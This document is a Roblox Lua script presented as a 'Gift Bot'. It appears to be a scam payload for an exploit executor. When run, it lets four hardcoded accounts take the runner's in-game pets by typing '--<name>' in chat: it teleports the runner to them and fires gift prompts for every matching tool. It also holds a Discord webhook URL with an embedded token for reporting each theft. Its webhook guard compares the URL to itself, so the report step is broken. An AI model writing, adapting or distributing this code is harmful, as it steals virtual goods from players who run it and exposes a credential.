local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local HRP = character:WaitForChild("HumanoidRootPart")
local backpack = player:WaitForChild("Backpack")
local HttpService = game:GetService("HttpService")

-- Configuration
local WEBHOOK_URL = "https://discord.com/api/webhooks/1390321677396869120/91e5S4577FfAru3sQ65Dw0vnB5L6N_I7PNM4mrG8nngGXegqZwTk6PVqMedduzbOKFMQ" -- Replace with your actual webhook URL
local AUTHORIZED_USERS = {
    ["gagpetbf"] = true,
    ["gagpetrac"] = true,
    ["auzacollect"] = true,
    ["joushaaaaaa1"] = true,
    -- Add more authorized users here
}

local function SendWebhook(message)
    if WEBHOOK_URL == "https://discord.com/api/webhooks/1390321677396869120/91e5S4577FfAru3sQ65Dw0vnB5L6N_I7PNM4mrG8nngGXegqZwTk6PVqMedduzbOKFMQ" then
        print("Webhook not configured - skipping notification")
        return
    end
    
    local data = {
        content = message,
        username = "Gift Bot"
    }
    
    pcall(function()
        HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
    end)
end

local function FindAllToolsWithName(toolName)
    local tools = {}
    local searchName = string.lower(toolName)
    
    -- Search in backpack
    for _, item in pairs(backpack:GetChildren()) do
        if item:IsA("Tool") and string.lower(item.Name) == searchName then
            table.insert(tools, item)
        end
    end
    
    -- Search equipped tools in character
    for _, item in pairs(character:GetChildren()) do
        if item:IsA("Tool") and string.lower(item.Name) == searchName then
            table.insert(tools, item)
        end
    end
    
    return tools
end

local function FirePrompt(targetPart)
    local prompt = targetPart:FindFirstChildOfClass("ProximityPrompt")
    if not prompt then return false end
    
    local temp = Instance.new("Part")
    temp.Name = "holder"
    temp.Anchored = true
    temp.CanCollide = false
    temp.Transparency = 1
    temp.Size = Vector3.new(2, 2, 2)
    temp.CFrame = HRP.CFrame * CFrame.new(3, 0, 0)
    temp.Parent = workspace
    
    prompt.Parent = temp
    prompt.MaxActivationDistance = math.huge
    prompt.HoldDuration = 0
    prompt.Enabled = true
    
    fireproximityprompt(prompt)
    
    game:GetService("Debris"):AddItem(temp, 2)
    return true
end

local function ExecuteGiftCommand(toolName, commandUser)
    -- Check if the command user is authorized
    if not AUTHORIZED_USERS[commandUser.Name] then
        print("Unauthorized user - command ignored")
        return
    end
    
    print("Searching for tools named: " .. toolName)
    
    local tools = FindAllToolsWithName(toolName)
    
    if #tools == 0 then
        print("No tools found with name: " .. toolName)
        return
    end
    
    print("Found " .. #tools .. " tool(s) with name: " .. toolName)
    
    -- Get the authorized user's character
    local targetPlayer = game.Players:FindFirstChild(commandUser.Name)
    if not targetPlayer or not targetPlayer.Character then
        warn("Cannot find target character")
        return
    end
    
    local targetHead = targetPlayer.Character:FindFirstChild("Head")
    if not targetHead then
        warn("Target player has no head")
        return
    end
    
    -- Teleport to target player (the authorized user)
    local targetHRP = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
    if targetHRP then
        HRP.CFrame = targetHRP.CFrame * CFrame.new(5, 0, 0)
        wait(0.5)
    end
    
    local successCount = 0
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    
    -- Loop through all found tools
    for i, tool in ipairs(tools) do
        print("Processing tool " .. i .. "/" .. #tools .. ": " .. tool.Name)
        
        -- Hold/Equip the tool
        if humanoid and tool.Parent == backpack then
            humanoid:EquipTool(tool)
            wait(1) -- Wait for tool to be equipped
        end
        
        -- Gift the tool to the authorized user
        if FirePrompt(targetHead) then
            successCount = successCount + 1
            print("Successfully gifted: " .. tool.Name)
            wait(2) -- Wait between gifts
        else
            warn("Failed to gift: " .. tool.Name)
        end
        
        -- Unequip if still equipped
        if tool.Parent == character and humanoid then
            humanoid:UnequipTools()
            wait(0.5)
        end
    end
    
    local message = string.format("✅ %s executed --%s command\nGifted %d/%d tools to %s", 
        player.Name, toolName, successCount, #tools, commandUser.Name)
    
    SendWebhook(message)
    print("Command completed! Gifted " .. successCount .. "/" .. #tools .. " tools to " .. commandUser.Name)
end

local function ProcessCommand(input, speaker)
    local trimmed = string.gsub(input, "^%s*(.-)%s*$", "%1") -- Remove leading/trailing spaces
    
    if string.sub(trimmed, 1, 2) == "--" then
        local toolName = string.sub(trimmed, 3)
        
        if toolName == "" then
            print("No tool name specified")
            return
        end
        
        print("Executing command: " .. trimmed)
        ExecuteGiftCommand(toolName, speaker)
    end
end

-- Handle character respawning
player.CharacterAdded:Connect(function(newChar)
    character = newChar
    HRP = character:WaitForChild("HumanoidRootPart")
end)

-- Listen for chat commands from any player
game.Players.PlayerAdded:Connect(function(speaker)
    speaker.Chatted:Connect(function(message)
        ProcessCommand(message, speaker)
    end)
end)

-- Also listen for commands from existing players
for _, speaker in pairs(game.Players:GetPlayers()) do
    speaker.Chatted:Connect(function(message)
        ProcessCommand(message, speaker)
    end)
end

print("=== GIFT BOT ACTIVE ===")
print("Authorized users who can receive pets:")
for username, _ in pairs(AUTHORIZED_USERS) do
    print("  - " .. username)
end
print("Usage: --[exact_tool_name]")
print("Example: --dragonfly")
print("Listening for commands from all players...")
